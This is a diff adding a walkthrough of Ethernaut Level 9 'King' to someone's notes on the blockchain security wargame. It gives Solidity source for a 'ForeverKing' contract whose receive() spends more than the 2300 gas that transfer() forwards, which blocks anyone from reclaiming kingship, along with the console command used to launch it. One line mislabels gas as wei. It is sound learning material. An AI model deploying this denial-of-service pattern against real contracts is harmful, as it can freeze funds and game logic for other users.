@@ -219,3 +219,39 @@ contract.unlock("0x412076657279207374726f6e67207365637265742070617373776f7264203
 ```
 
 > A lesson from this level: eveything on-chain is public. This is why zero-knowledge proofs are so important in blockchain work.
+
+# Level 9: King
+The goal here is to prevent the Ethernaut level from becoming 'king' again, after you submit the level. It doesn't say that you have to be king yourself. This took me a minute to see, but I think the trick is to make the king an address that isn't payable. Then, when the Ethernaut level tries to reclaim kinghood, `receive()` will fail when it tries to send the balance back, and revert, making the unpayable king unusurpable.
+
+> A lesson from this level: don't assume all addresses are payable.
+
+I don't think I can make my own wallet unpayable, but I didn't look into it, as I can just make an unpayable contract, then make that contract king, and then we are golden. You can't give a contract any balance during contract creation though, so I'll need to make the contract somewhat payable, I'll just have to make it so that the Ethernaut level fails when it tries to pay it back.
+
+I implemented a solution this way, but I came across something while I was working on it that I want to use to break the level instead. It's a subtle difference: instead of making the king unpayable, I will make it so the king can't be paid via the `transfer()` method. This method only allocates 2300 gas for the fallback method to use, so if we exceed this amount, it will fail and revert. I think the way the Ethernaut devs built the original `King` contract was to intentionally drop us into the same trap, which was clever.
+
+At this point I also got sick of defining contracts in the Ethernaut console, so i built a couple of helpers:
+```
+var makeContract = (addr, abi) => { var con = new web3.eth.Contract(abi, addr); con.options.from=player; return con; };
+
+var wei = x => web3.utils.toWei(x, "ether");
+```
+
+So I built the following contract, which can not receive funds via `transfer()`. I could have just written a loop or something to burn the 2300 wei, but I figured that calling the `transfer()` method itself will of course burn more than 2300 wei, so that should do the trick. I suppose if this wasn't going to run out of gas this would become some kind of reentrancy problem, but that's a topic for the next level I think.
+```
+// SPDX-License-Identifier: GPL-3.0
+pragma solidity >=0.7.0 <0.9.0;
+
+contract ForeverKing {
+    function usurp(address payable kingGame) payable external {
+        payable(kingGame).call{value: address(this).balance}("");
+    }
+
+    receive() external payable {
+        payable(msg.sender).transfer(msg.value);
+    }
+}
+```
+I deployed the above contract and invoked it with the following, which completed the level.
+```
+await con.methods.usurp(contract.address).send({value:wei("0.0015")})
+```
